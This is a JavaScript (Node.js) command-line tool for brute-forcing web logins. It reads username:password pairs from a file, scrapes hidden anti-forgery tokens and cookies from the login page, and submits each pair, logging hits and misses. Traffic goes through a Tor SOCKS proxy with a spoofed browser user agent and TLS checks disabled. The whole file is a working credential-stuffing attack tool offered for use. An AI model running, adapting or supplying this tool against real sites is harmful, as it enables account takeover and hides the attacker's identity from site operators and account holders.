/**
 * A web login bruteforcer with support for SOCKS5 and HTTP proxy, and CFLR tokens.
 * Usage:
 * -u url of page to get CFLR token and cookie
 * -l url of login page (defaults to CFLR page)
 * -c file containing username:password combinations
 * -p post data. Replace password field with `PASS`, username field with `USER`, and CFLR token with a jquery select
 * -r max number of tries per minute
 * -f the substring that signifies a failed login
 * @author Kevin Wang
 * @version 0.1
 * @licence MIT
 */

const Request = require('request');
const jar = Request.jar();
const request = Request.defaults({jar: jar});
const RateLimiter = require('limiter').RateLimiter;
const cheerio = require('cheerio'); //lightweight jQuery
const Promise = require('bluebird'); //until ECMAScript 7 await async...
const meow = require('meow');

const cli = meow(`
        Usage
          $ brute.js
        Options
          -u, --url             url of page to get CFLR token and cookie
          -l, --login           url of login page (defaults to CFLR page)
          -c, --login-file      file containing username:password combinations
          -p, --data            post data. Replace password field with \`PASS\`, username field with \`USER\`, and CFLR token with a jquery select
          -r, --retries         max number of tries per minute
          -f, --failed-message  the substring that signifies a failed login
`, {
    string: 'url',
    string: 'login',
    string: 'login-file',
    string: 'data',
    string: 'retries',
    string: 'failed-message',
    alias: { u: 'url', l: 'login', c: 'login-file', p: 'data', r: 'retries', f: 'failed-message' },
    default: { retries: 10 }
});

//use https client if url is https
const Agent = cli.flags.url.indexOf("https") == -1 ? require('socks5-http-client/lib/Agent') : require('socks5-https-client/lib/Agent');
var socksProxy = true;
var httpProxy = false;
var userPassFile = cli.flags.c; //'comboExamples.txt';
//limit rate the prevent overloading network
var limiter = new RateLimiter(cli.flags.retries, 'minute');
//require('request').debug = true;

/**
 * this function will be fed content from initial request to parse token.
 * @return token is the first hidden value
 */
var options = {
    url: cli.flags.url,
    headers: {
        Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        //for now only accept text
        'Accept-Encoding': 'text/html',//'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.8',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36'
    },
    forever: true,
    strictSSL: false //for debuggin purposes
};
//use tor proxy TODO: support proxy list
if (socksProxy) {
    options.agentClass = Agent;
    options.agentOptions = {
        socksHost: 'localhost',
        socksPort: 9050
    }
} else if (httpProxy) { // can't have both socks and http proxy
    options.proxy = 'http://127.0.0.1:8080';
}

postParams = cli.flags.data; //'formunqid=`input[type=hidden]`&userid=`USER`&password=`PASS`&submit=Login';
//extract token jqueries
//if there no tokens, then directly brute
tokenSelectors = postParams.split('`').filter((value) => {
    return value.includes('[') && value.includes(']')
});
//read username and password combinations
var lineReader = require('readline').createInterface({
    input: require('fs').createReadStream(userPassFile)
});
lineReader.on('line', function (line) {
    //
    var user = line.split(":")[0];
    var pass = line.split(":")[1];

    // console.log(line);
    limiter.removeTokens(1, function (err, remainingRequests) {

        brute(options, tokenSelectors, postParams, user, pass);
    });
});
//extract tokens using jquery format
function getSelections(html, select) {
    var $ = cheerio.load(html);
    var selections = {};
    for (var i = 0; i < select.length; i++) {
        selections[select[i]] = $(select[i]).val();
    }
    return selections;
}

// get the token
function brute(options, tokenSelectors, postParam, user, pass) {
    function getToken() {
        //make request to url without params TODO:allow user control
        options.url = cli.flags.login || cli.flags.url;
        return new Promise(
            function (resolve, reject) {
                request(options, function (err, res) {
                    if (err) console.error(err);
                    //reset the url
                    options.url = cli.flags.url;
                    var token = getSelections(res.body, tokenSelectors);
                    resolve({'token': token, 'cookie': res.headers['set-cookie']});
                });
            }
        );
    }

    //attempt a single brute force
    function attemptBrute(loginToken, cookie) {
        return new Promise(
            function (resolve, reject) {
                for (var replace in loginToken) {
                    postParams = postParam.replace("`" + replace + "`", loginToken[replace])
                }
                params = postParams.replace('`USER`', user).replace('`PASS`', pass);
                options.method = 'POST';
                options.body = params;
                options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
                if (cookie)
                    options.headers.Cookie = cookie.toString();
                request(options, function (err, httpResponse, body) {
                    if (err) console.error(err);
                    resolve(body);
                });
            }
        )
    }

    //refactor this should be the actual brute() function.
    var main = Promise.coroutine(function *() {
        tokens = tokenSelectors.size == 0 ? null : yield getToken();
        var bruteAttempt = yield attemptBrute(tokens.token, tokens.cookie);
        console.log(bruteAttempt);
        //if attempt was a fail
        if (bruteAttempt.indexOf(cli.flags.f) != -1)
            console.log("MISS! " + user + ":" + pass);
        else //success
            console.log("HIT! " + user + ":" + pass);
    });
    main();
}
